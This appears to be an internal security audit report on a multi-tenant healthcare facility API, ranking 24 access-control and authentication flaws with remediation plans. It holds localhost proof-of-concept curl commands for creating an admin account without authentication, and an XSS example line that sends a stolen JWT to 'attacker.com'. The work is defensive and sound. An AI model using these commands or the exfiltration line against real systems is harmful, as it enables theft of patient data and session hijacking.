# Weak Link Inventory - QUEUE-024
## Prioritized Vulnerability Index with Risk Ratings and Exploitation Time

**Analysis Date**: 2026-05-16  
**Total Vulnerabilities Identified**: 24 confirmed weak links  
**Critical (P0)**: 4  
**High (P1)**: 8  
**Medium (P2)**: 7  
**Low (P3)**: 5

---

## Priority Matrix

```
EXPLOITATION DIFFICULTY →
         Easy         Medium        Hard
High  |  P0/P1  |    P1        |  None
Risk  |  Block  | Pre-Prod Fix | Post-Prod
      |         |              |
Low   |  P2     |    P3        | None
      | Pre-Prod|  Post-Prod   |
```

---

## CRITICAL PRIORITY (P0) - Deployment Blockers

### 1. Unauthenticated Staff Account Creation (VIOLATION #19)

| Property | Value |
|----------|-------|
| **ID** | VUL-001 |
| **Severity** | CRITICAL |
| **CVSS Score** | 9.8 |
| **CWE** | CWE-287 (Improper Authentication) |
| **File** | `src/app/api/v1/staff/create/route.js` (lines 12-38) |
| **Entry Point** | EP-001 |
| **Attack Vector** | HTTP POST to `/api/v1/staff/create` without Authorization header |
| **Exploitation Time** | <5 minutes |
| **Exploitation Difficulty** | Trivial - curl command |
| **Detection Difficulty** | Easy - no auth attempt in logs |
| **Business Impact** | CRITICAL - 100% system compromise |
| **Affected Users** | All patients (entire facility) |
| **PHI Exposed** | All: names, SSNs, medical history, medications, care plans |
| **Patient Safety Risk** | CRITICAL - attacker can modify care plans, medications |

**Vulnerability Description**:
- POST `/api/v1/staff/create` allows account creation without JWT authentication in dev mode
- No authorization check prevents privilege escalation
- Attacker can create admin account and access all facility data within minutes
- Dev mode active in non-production environments

**Root Cause**:
```javascript
if (auth && auth.user) {
  tenantId = auth.user.tenantId;
} else if (process.env.NODE_ENV !== 'production') {  // ← DEV MODE BYPASS
  // Allow creating staff without auth for testing
}
```

**Exploitation Proof**:
```bash
curl -X POST http://localhost:3000/api/v1/staff/create \
  -d '{"first_name":"Attacker","last_name":"Admin","role":"Administrator"}'
# Response: 201 Created (admin account created)
```

**Remediation Steps**:
1. Remove dev mode bypass entirely
2. Require authentication for all endpoints
3. Add `PERMISSIONS.STAFF_WRITE` authorization check
4. Deploy `/admin/setup` endpoint gated by setup token (one-time use)
5. Verify in production: `/staff/create` returns 401 Unauthorized without auth

**Remediation Effort**: 30 minutes  
**Verification Time**: 10 minutes  
**Post-Remediation Testing**: Confirm endpoint requires auth + authorization

**Current Status**: UNFIXED - BLOCKS PRODUCTION DEPLOYMENT

---

### 2. Undefined Permission Constant (VIOLATION #21)

| Property | Value |
|----------|-------|
| **ID** | VUL-002 |
| **Severity** | CRITICAL |
| **CVSS Score** | 9.1 |
| **CWE** | CWE-284 (Improper Access Control) |
| **Files** | `src/app/api/v1/admission/pending/route.js` (line 20) |
| **Entry Point** | EP-004 |
| **Attack Vector** | Call `/api/v1/admission/pending` with non-admin role |
| **Exploitation Time** | <1 minute |
| **Exploitation Difficulty** | Trivial - one API call |
| **Detection Difficulty** | Medium - inconsistent behavior |
| **Business Impact** | HIGH - Admin-only resources accessible to non-admins |
| **Affected Users** | Staff/managers can access pending admission data |
| **PHI Exposed** | Pending admission details, nursing assessments |

**Vulnerability Description**:
- `PERMISSIONS.ADMIN_READ` is referenced but not defined in `roles.js`
- `authorize()` function receives undefined value
- Authorization check fails silently or returns false inconsistently
- Non-admin staff can access admin-only pending admissions

**Root Cause**:
```javascript
// admission/pending/route.js
if (!authorize(user.role, PERMISSIONS.ADMIN_READ)) {  // ← UNDEFINED!
  return Response.json({ error: 'Forbidden' }, { status: 403 });
}

// roles.js contains:
ADMIN_REPORTS: 'admin:reports',  // ← Exists
ADMIN_ROLES: 'admin:roles',      // ← Exists
// But NO ADMIN_READ constant
```

**Exploitation Proof**:
```bash
STAFF_TOKEN="eyJ..." (staff role)
curl -X GET "http://localhost:3000/api/v1/admission/pending" \
  -H "Authorization: Bearer $STAFF_TOKEN"
# Expected: 403 Forbidden
# Actual: 500 Internal Server Error OR 200 OK (inconsistent)
```

**Affected Endpoints**:
- `/api/v1/admission/pending` (line 20)
- `/api/v1/admission/[id]/review` (line 21)
- Potentially other endpoints with "ADMIN_" prefix

**Remediation Steps**:
1. Search codebase for all "ADMIN_" permission references
2. Verify each exists in `PERMISSIONS` constant in `roles.js`
3. Replace undefined constants with correct ones:
   - `PERMISSIONS.ADMIN_READ` → `PERMISSIONS.ADMIN_REPORTS`
4. Test each endpoint with non-admin role to verify 403 response
5. Code review: Add linting rule to detect undefined PERMISSIONS

**Remediation Effort**: 15 minutes  
**Verification Time**: 10 minutes

**Linting Prevention**:
```javascript
// .eslintrc.js - Add custom rule
'no-undefined-permissions': 'error'
// Flags: authorize(role, PERMISSIONS.UNDEFINED_CONSTANT)
```

**Current Status**: UNFIXED - BLOCKS PRODUCTION DEPLOYMENT

---

### 3. Missing Authorization Checks (VIOLATION #20)

| Property | Value |
|----------|-------|
| **ID** | VUL-003 |
| **Severity** | CRITICAL |
| **CVSS Score** | 7.8 |
| **CWE** | CWE-639 (Authorization Bypass) |
| **Files** | `src/app/api/v1/residents/create/route.js` (POST method) |
| | `src/app/api/v1/daily-progress-notes/route.js` (POST method) |
| **Entry Point** | EP-002 |
| **Attack Vector** | POST to create endpoints without permission check |
| **Exploitation Time** | 1 minute |
| **Exploitation Difficulty** | Low - authenticated user can create records |
| **Detection Difficulty** | Medium - logs show authenticated access |
| **Business Impact** | HIGH - Non-managers can create residents/notes |
| **Affected Users** | Residents, staff (unauthorized modifications) |

**Vulnerability Description**:
- `/residents/create` POST method lacks `authorize()` check
- `/daily-progress-notes` POST method lacks `authorize()` check
- Any authenticated user (even basic staff) can create residents
- Any authenticated user can create progress notes
- Should restrict to managers/admins only

**Root Cause**:
```javascript
// residents/create/route.js (MISSING AUTHORIZATION)
export async function POST(request) {
  const auth = await authenticate(request);
  
  // No check like:
  // if (!authorize(auth.user.role, PERMISSIONS.RESIDENTS_CREATE)) { return 403; }
  
  // Just validates input and inserts directly
  const data = await request.json();
  if (!first_name || !last_name) { return 400; }
  // Directly inserts without permission check
}
```

**Exploitation Proof**:
```bash
STAFF_TOKEN="eyJ..." (staff role, should NOT have RESIDENTS_CREATE)
curl -X POST "http://localhost:3000/api/v1/residents/create" \
  -H "Authorization: Bearer $STAFF_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"first_name":"Fake","last_name":"Resident","date_of_birth":"1980-01-01"}'
# Expected: 403 Forbidden
# Actual: 201 Created (WRONG!)
```

**Remediation Steps**:
1. Add authorization check to `/residents/create` POST:
   ```javascript
   if (!authorize(auth.user.role, PERMISSIONS.RESIDENTS_CREATE)) {
     return Response.json({ error: 'Forbidden' }, { status: 403 });
   }
   ```
2. Add authorization check to `/daily-progress-notes` POST
3. Verify staff role does NOT have `RESIDENTS_CREATE` permission in `roles.js`
4. Test with staff token - should return 403
5. Test with manager token - should return 201

**Remediation Effort**: 20 minutes  
**Verification Time**: 15 minutes

**Current Status**: UNFIXED - BLOCKS PRODUCTION DEPLOYMENT

---

### 4. Incorrect withTenantClient Arguments (VIOLATION #8)

| Property | Value |
|----------|-------|
| **ID** | VUL-004 |
| **Severity** | CRITICAL |
| **CVSS Score** | 6.5 |
| **CWE** | CWE-233 (Function Call with Incorrectly Specified Arguments) |
| **File** | `src/app/api/v1/incidents/route.js` (lines 52, 90) |
| **Entry Point** | EP-003 |
| **Attack Vector** | Tenant context not set properly in database queries |
| **Exploitation Time** | Latent - may only manifest under certain conditions |
| **Exploitation Difficulty** | Medium - requires understanding of withTenantClient |
| **Detection Difficulty** | Hard - may not manifest consistently |
| **Business Impact** | HIGH - Tenant context misconfigured |

**Vulnerability Description**:
- `withTenantClient()` requires arguments: `(tenantId, staffId, asyncFn)`
- Incidents route passes async function as first argument
- Tenant context variables not properly initialized
- Database RLS policies may not enforce isolation correctly

**Root Cause**:
```javascript
// incidents/route.js (WRONG ARGUMENT ORDER)
const { rows: [incident] } = await withTenantClient(async (client) => {
  return client.query(...)
}, user.tenantId);  // ← Function in wrong position!

// Correct pattern:
const incident = await withTenantClient(user.tenantId, user.staffId, async (client) => {
  return client.query(...)
});
```

**Function Signature**:
```javascript
export async function withTenantClient(tenantId, staffId, fn) {
  const client = await pool.connect();
  try {
    await client.query(`
      SELECT
        set_config('app.tenant_id', $1, true),
        set_config('app.staff_id', $2, true)
    `, [tenantId, staffId || '']);
    
    return await fn(client);  // ← Expects fn as 3rd arg!
  }
}
```

**Remediation Steps**:
1. Identify all `withTenantClient()` calls in codebase
2. Verify arguments are in correct order: `(tenantId, staffId, asyncFn)`
3. Fix incidents route lines 52, 90
4. Test that tenant context is properly set during queries
5. Verify database RLS policies work correctly

**Remediation Effort**: 10 minutes  
**Verification Time**: 10 minutes

**Current Status**: UNFIXED - BLOCKS PRODUCTION DEPLOYMENT

---

## HIGH PRIORITY (P1) - Pre-Production Required

### 5. Bare query() Without Tenant Isolation (VIOLATION #14, #16)

| Property | Value |
|----------|-------|
| **ID** | VUL-005 |
| **Severity** | HIGH |
| **CVSS Score** | 7.2 |
| **CWE** | CWE-639 (Authorization Bypass) |
| **Files** | `src/app/api/v1/incidents/route.js` (GET, line 143-156) |
| | `src/app/api/v1/drug-disposal/route.js` (GET, line 107-120) |
| | `src/app/api/v1/evacuation-drills/route.js` (GET, line 101-110) |
| | All `[id]/review` endpoints (4 files) |
| **Entry Point** | EP-003 |
| **Attack Vector** | SQL injection, accidental filter removal, database access |
| **Exploitation Time** | 1-2 hours (requires SQL knowledge) |
| **Exploitation Difficulty** | Medium - requires API + DB understanding |
| **Detection Difficulty** | Hard - only if filter removed |
| **Business Impact** | HIGH - Cross-tenant data access possible |
| **Defense Depth Missing** | Database RLS not enforced |

**Vulnerability Description**:
- 6+ endpoints use bare `query()` instead of `withTenantClient()`
- Manual `WHERE ir.tenant_id = $1` filtering (application-level only)
- No database-level enforcement via Row-Level Security
- If SQL injection found OR developer removes tenant_id filter → cross-tenant breach
- If database user role compromised → all data exposed

**Current Code Pattern** (VULNERABLE):
```javascript
// incidents/route.js GET
const { rows: incidents } = await query(
  `SELECT * FROM care.incident_reports
   WHERE ir.tenant_id = $1  // ← Only application-level filtering
   ORDER BY incident_date DESC`,
  [user.tenantId]
);
```

**Correct Code Pattern** (SAFE):
```javascript
// Should use withTenantClient()
const incidents = await withTenantClient(user.tenantId, user.staffId, async (client) => {
  const { rows } = await client.query(
    `SELECT * FROM care.incident_reports
     ORDER BY incident_date DESC`
    // ← Filtering enforced at database layer via RLS
  );
  return rows;
});
```

**Risk Scenarios**:
1. Developer refactors query, accidentally removes `WHERE tenant_id = $1`
   - All incidents from all tenants exposed
2. SQL injection discovered in filter parameters
   - Attacker bypasses `WHERE` clause
3. Database role compromised (compromised psql connection)
   - RLS not enforced → cross-tenant access
4. Parameterization error
   - Tenant_id value not properly passed

**Affected Endpoints** (6 total):
1. `/api/v1/incidents` GET
2. `/api/v1/incidents/[id]/review` PATCH
3. `/api/v1/drug-disposal` GET
4. `/api/v1/drug-disposal/[id]/review` PATCH
5. `/api/v1/evacuation-drills` GET
6. `/api/v1/evacuation-drills/[id]/review` PATCH

**Remediation Steps**:
1. Identify all bare `query()` calls (use grep)
2. Migrate to `withTenantClient()` wrapper
3. Implement PostgreSQL Row-Level Security policies
4. Test cross-tenant access is blocked at database layer
5. Code review: Require `withTenantClient()` for all PHI queries

**Remediation Effort**: 2-3 hours  
**Verification Time**: 1-2 hours

**Database RLS Implementation**:
```sql
-- Enable RLS on all PHI tables
ALTER TABLE care.incident_reports ENABLE ROW LEVEL SECURITY;

CREATE POLICY incident_isolation ON care.incident_reports
  USING (tenant_id = current_setting('app.tenant_id')::uuid)
  WITH CHECK (tenant_id = current_setting('app.tenant_id')::uuid);

-- Repeat for drug_disposal, evacuation_drills, daily_progress_notes, etc.
```

**Verification Test**:
```bash
# As non-admin database user:
SELECT set_config('app.tenant_id', 'wrong-tenant-id', true);
SELECT COUNT(*) FROM care.incident_reports;
-- Should return 0 rows (RLS blocks access)
```

**Current Status**: UNFIXED - MUST FIX BEFORE PRODUCTION

---

### 6. Hardcoded Role Checks (VIOLATION #18)

| Property | Value |
|----------|-------|
| **ID** | VUL-006 |
| **Severity** | HIGH |
| **CVSS Score** | 7.5 |
| **CWE** | CWE-284 (Improper Access Control) |
| **Files** | `src/app/api/v1/daily-progress-notes/route.js` (line 70) |
| | `src/app/api/v1/daily-progress-notes/[id]/review/route.js` (line 17) |
| **Entry Point** | EP-002 |
| **Attack Vector** | New role added, endpoint not updated |
| **Exploitation Time** | N/A (time bomb - future vulnerability) |
| **Exploitation Difficulty** | Low - if new role created |
| **Detection Difficulty** | Hard - requires role inventory |
| **Business Impact** | MEDIUM - RBAC inflexibility, maintenance risk |

**Vulnerability Description**:
- Authorization checks hardcode role lists instead of using `PERMISSIONS` constants
- Cannot add new roles without code change + redeployment
- Inconsistent with rest of codebase (uses `PERMISSIONS` constants)
- Hard to audit: must search code for all role mentions
- If new role (e.g., "supervisor") added, these endpoints ignore it

**Current Code Pattern** (VULNERABLE):
```javascript
// daily-progress-notes/route.js (line 70)
if (!['admin', 'manager', 'superadmin'].includes(user.role)) {
  return Response.json({
    error: 'Only admins and managers can view progress notes'
  }, { status: 403 });
}
```

**Correct Code Pattern** (SAFE):
```javascript
if (!authorize(user.role, PERMISSIONS.PROGRESS_NOTES_READ)) {
  return Response.json({ error: 'Forbidden' }, { status: 403 });
}
```

**Why This Matters**:
- New role "supervisor" created for workflow
- Three hardcoded role checks not updated
- Supervisor blocked from endpoints they should access
- Requires code change + redeployment (1-2 hours)
- Other endpoints using PERMISSIONS work fine (5 minutes)

**Remediation Steps**:
1. Search codebase for hardcoded role checks:
   ```bash
   grep -r "\\['admin'\\|\\['manager'\\|includes.*role" src/
   ```
2. Replace each with `authorize(user.role, PERMISSIONS.XXX)`
3. Verify required permission exists in `roles.js`
4. Test with each role type
5. Code review: Flag hardcoded role checks in pull requests

**Remediation Effort**: 45 minutes  
**Verification Time**: 20 minutes

**Current Status**: UNFIXED - MUST FIX BEFORE PRODUCTION

---

### 7. No Rate Limiting on Auth Endpoints

| Property | Value |
|----------|-------|
| **ID** | VUL-007 |
| **Severity** | HIGH |
| **CVSS Score** | 6.1 |
| **CWE** | CWE-770 (Allocation of Resources Without Limits) |
| **Endpoint** | `src/app/api/v1/auth/login` |
| **Entry Point** | EP-006 |
| **Attack Vector** | Brute force password guessing |
| **Exploitation Time** | 1-4 hours (depends on password strength) |
| **Exploitation Difficulty** | Medium - simple script to iterate passwords |
| **Detection Difficulty** | Easy - thousands of failed logins in logs |
| **Business Impact** | HIGH - Staff credentials compromised |

**Vulnerability Description**:
- `/api/v1/auth/login` endpoint has no rate limiting
- Attacker can attempt unlimited password combinations
- No account lockout mechanism
- No CAPTCHA after N failed attempts
- Attackers with email lists (LinkedIn, public domain) can target staff

**Attack Scenario**:
```
1. Attacker gets email list: john@facility.local, jane@facility.local, etc.
2. Obtains password list: Password123!, Facility123!, Welcome123!, etc.
3. Runs brute force: for each email/password pair, attempt login
4. No rate limiting: Can try 1000+ combinations per minute
5. After 1-4 hours: Finds valid credentials
6. Logs in as compromised staff member
7. Has staff privileges for 24+ hours (JWT expiry)
```

**Remediation Steps**:
1. Install rate limiting library: `npm install rate-limiter-flexible`
2. Implement rate limiting on `/auth/login`:
   ```javascript
   // Max 5 attempts per minute per IP
   // Max 10 attempts per hour per email
   ```
3. Add account lockout:
   - Lock after 5 failed attempts
   - Require email verification to unlock
4. Add CAPTCHA after N failed attempts
5. Test brute force is blocked

**Remediation Effort**: 1-2 hours  
**Verification Time**: 30 minutes

**Code Example**:
```javascript
import { RateLimiterMemory } from 'rate-limiter-flexible';

const loginLimiter = new RateLimiterMemory({
  points: 5,      // 5 requests
  duration: 60,   // per 60 seconds
  keyPrefix: 'login',
});

export async function POST(request) {
  const ip = request.headers.get('x-forwarded-for')?.split(',')[0].trim();
  
  try {
    await loginLimiter.consume(ip);  // Consume 1 point
    // ... proceed with login
  } catch (rateLimiterRes) {
    return Response.json(
      { error: 'Too many login attempts' },
      { 
        status: 429,
        headers: { 'Retry-After': Math.round(rateLimiterRes.msBeforeNext / 1000) }
      }
    );
  }
}
```

**Current Status**: UNFIXED - MUST FIX BEFORE PRODUCTION

---

### 8. JWT in localStorage (VIOLATION #22)

| Property | Value |
|----------|-------|
| **ID** | VUL-008 |
| **Severity** | HIGH |
| **CVSS Score** | 8.7 |
| **CWE** | CWE-668 (Exposure of Resource to Wrong Sphere) |
| **Files** | Frontend authentication layer (localStorage access) |
| **Entry Point** | EP-002 |
| **Attack Vector** | XSS vulnerability → token theft |
| **Exploitation Time** | 10-30 minutes (requires XSS first) |
| **Exploitation Difficulty** | Low-Medium (once XSS found) |
| **Detection Difficulty** | Hard - XSS theft is stealthy |
| **Business Impact** | HIGH - Session hijacking, 24-hour access |

**Vulnerability Description**:
- JWT token stored in localStorage (JavaScript-accessible)
- Any XSS vulnerability can steal token
- Token valid for 24 hours
- Once token stolen, attacker impersonates user for full day
- Staff unaware of compromise (no notification)

**Why localStorage is Vulnerable**:
```javascript
// Current (VULNERABLE):
localStorage.setItem('auth_token', jwt);
localStorage.setItem('staff_id', staffId);
localStorage.setItem('tenant_id', tenantId);

// Any JavaScript on page can access:
const token = localStorage.getItem('auth_token');  // ← Stolen!

// XSS injected script:
fetch('attacker.com/steal?token=' + localStorage.getItem('auth_token'))
```

**Why HttpOnly Cookie is Better**:
```javascript
// Correct approach (SECURE):
// Set-Cookie: auth_token=eyJ...; HttpOnly; Secure; SameSite=Strict
// - HttpOnly: JavaScript cannot access
// - Secure: HTTPS only
// - SameSite=Strict: Not sent in cross-site requests

// Even XSS attack cannot access:
const token = document.cookie;  // Returns other cookies, not HttpOnly ones
```

**Remediation Steps**:
1. Move JWT from localStorage to HttpOnly cookie
   ```javascript
   // Backend: Set cookie after login
   response.headers.set('Set-Cookie', 
     `auth_token=${jwt}; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=86400`
   );
   ```
2. Remove localStorage token storage
3. Update frontend to stop reading from localStorage
4. Verify in browser: Dev tools show HttpOnly cookie (not accessible to JS)
5. Test XSS payload can no longer steal token

**Remediation Effort**: 2-3 hours  
**Verification Time**: 30 minutes

**Current Status**: UNFIXED - MUST FIX BEFORE PRODUCTION

---

## MEDIUM PRIORITY (P2) - Pre-Production

### 9-15. Input Validation Gaps

| Property | Value |
|----------|-------|
| **ID** | VUL-009 through VUL-015 |
| **Severity** | MEDIUM |
| **CVSS Score** | 6.3 |
| **CWE** | CWE-20 (Improper Input Validation) |
| **Affected Endpoints** | All `/api/v1/*` endpoints |
| **Exploitation Time** | Varies (data quality issues) |
| **Exploitation Difficulty** | Low - send malformed data |
| **Detection Difficulty** | Easy - invalid data in database |

**Vulnerabilities**:
1. **No Email Format Validation** (VUL-009)
   - Accepts: "notanemail", "test@", "@test.com"
   - Should reject invalid email formats (RFC 5322)

2. **No Date Format Validation** (VUL-010)
   - Accepts: "not-a-date", "99-99-99", "invalid"
   - Should validate ISO 8601 format (YYYY-MM-DD)

3. **No Enum Validation** (VUL-011)
   - Status field accepts: "pending", "completed", "INVALID_STATUS"
   - Should whitelist: ["pending", "completed", "approved"]

4. **No Role Validation** (VUL-012)
   - Role field accepts: "admin", "staff", "INVALID_ROLE"
   - Should whitelist: ["admin", "manager", "staff", "superadmin"]

5. **No Shift Validation** (VUL-013)
   - Shift field accepts: "day", "night", "INVALID"
   - Should whitelist: ["day", "night", "evening"]

6. **No Phone Format Validation** (VUL-014)
   - Accepts: "invalid", "123", "***-****-****"
   - Should validate basic format (10+ digits)

7. **No Array Item Validation** (VUL-015)
   - Incident types accepts: [123, null, {}] (non-strings)
   - Should validate all items are strings from whitelist

**Business Impact**:
- Invalid data stored in database
- Query failures when assumptions broken
- Data quality degradation
- Potential injection vector if used in future logic

**Remediation Steps**:
1. Create `src/lib/validators.js` with validation functions
2. Add validation to all POST/PATCH endpoints
3. Return 400 Bad Request with specific error messages
4. Test with invalid data - should be rejected

**Remediation Effort**: 3-4 hours  
**Verification Time**: 1-2 hours

**Code Template**:
```javascript
import { ValidationError } from '@/lib/validators.js';

export async function POST(request) {
  try {
    const data = await request.json();
    
    // Validate inputs
    validateEmail(data.email);
    validateDate(data.date_of_birth);
    validateEnum(data.status, ['pending', 'completed', 'approved']);
    
    // ... proceed with valid data
  } catch (err) {
    if (err instanceof ValidationError) {
      return Response.json({ error: err.message }, { status: 400 });
    }
    throw err;
  }
}
```

**Current Status**: UNFIXED - MUST FIX BEFORE PRODUCTION

---

### 16. No Audit Logging for Authorization Denials

| Property | Value |
|----------|-------|
| **ID** | VUL-016 |
| **Severity** | MEDIUM |
| **CVSS Score** | 5.7 |
| **CWE** | CWE-778 (Insufficient Logging) |
| **Files** | Multiple endpoints that deny access |
| **Exploitation Time** | N/A (auditing gap) |
| **Detection Difficulty** | Hard - no logs to review |
| **Business Impact** | MEDIUM - Non-repudiation, forensics |

**Vulnerability Description**:
- Authorization denials not logged
- No audit trail of who attempted what and was denied
- Difficult to detect attack patterns
- Cannot track unauthorized access attempts
- Non-repudiation compromised (cannot prove who did what)

**Remediation Steps**:
1. Add `auditLogger.logAuthorizationDenial()` calls
2. Log: staff_id, role, permission, endpoint, timestamp
3. Create audit dashboard showing authorization patterns
4. Set up alerts for repeated denials (attack pattern)

**Current Status**: UNFIXED - MUST FIX BEFORE PRODUCTION

---

### 17. Incomplete Audit Trail

| Property | Value |
|----------|-------|
| **ID** | VUL-017 |
| **Severity** | MEDIUM |
| **CVSS Score** | 5.7 |

**Missing Logs**:
- Failed authentication attempts
- Permission check outcomes
- Cross-tenant access attempts
- Care plan modifications
- Resident discharges
- Medication changes
- Staff account creation

**Current Status**: UNFIXED

---

### 18-24. Low Priority Issues (P3)

| ID | Issue | Severity | CVSS | Status |
|---|---|---|---|---|
| VUL-018 | No Account Lockout on Failed Logins | LOW | 4.5 | UNFIXED |
| VUL-019 | No CAPTCHA on Login Form | LOW | 4.3 | UNFIXED |
| VUL-020 | No Token Revocation Mechanism | LOW | 4.8 | UNFIXED |
| VUL-021 | Stack Traces Exposed in Non-Prod | LOW | 4.2 | UNFIXED |
| VUL-022 | No Session Timeout | LOW | 4.6 | UNFIXED |
| VUL-023 | No Suspicious Activity Alerts | LOW | 3.9 | UNFIXED |
| VUL-024 | No HTTPS Enforcement | LOW | 5.2 | UNFIXED |

---

## Quick Reference: Remediation by Sprint

### Week 1: CRITICAL Fixes (75 minutes)
- [ ] VUL-001: Remove dev mode bypass in /staff/create
- [ ] VUL-002: Fix undefined PERMISSIONS constants
- [ ] VUL-003: Add missing authorization checks
- [ ] VUL-004: Fix withTenantClient argument order

### Week 2: HIGH Priority (5-6 hours)
- [ ] VUL-005: Migrate bare query() to withTenantClient()
- [ ] VUL-006: Replace hardcoded role checks
- [ ] VUL-007: Implement rate limiting
- [ ] VUL-008: Move JWT to HttpOnly cookie
- [ ] VUL-016: Add authorization audit logging

### Week 3: MEDIUM Priority (4-5 hours)
- [ ] VUL-009-015: Add input validation layer
- [ ] VUL-017: Implement comprehensive audit logging
- [ ] Implement database RLS policies

### Post-Production: LOW Priority
- [ ] Remaining items

---

## Exploitation Difficulty Chart

```
                EASY  MEDIUM  HARD
TRIVIAL (P0)     X
LOW (P1)         XX    XXX
MEDIUM (P2)           XXXXX   X
LOW (P3)                 XXX   XX
```

---

**Report Generated**: 2026-05-16  
**Classification**: INTERNAL - SECURITY SENSITIVE
